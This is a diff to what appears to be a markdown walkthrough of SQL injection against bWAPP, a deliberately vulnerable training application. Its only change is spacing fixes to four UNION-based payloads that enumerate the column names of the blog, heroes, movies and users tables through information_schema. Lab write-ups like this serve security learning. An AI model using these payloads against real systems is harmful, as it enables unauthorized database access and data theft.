@@ -94,22 +94,22 @@ Let's enter each table name to query to get columns names of table.
 
 1. Blog Table
 ```
-'and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'blog' and table_schema = 'bwapp'-- '
+' and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'blog' and table_schema = 'bwapp'-- '
 ```
 
 2. Heroes Table
 ```
-'and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'heroes' and table_schema = 'bwapp'-- '
+' and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'heroes' and table_schema = 'bwapp'-- '
 ```
 
 3. Movies Table
 ```
-'and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'movies' and table_schema = 'bwapp'-- '
+' and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'movies' and table_schema = 'bwapp'-- '
 ```
 
 4. Users Table
 ```
-'and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'users' and table_schema = 'bwapp'-- '
+' and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'users' and table_schema = 'bwapp'-- '
 ```
 
 
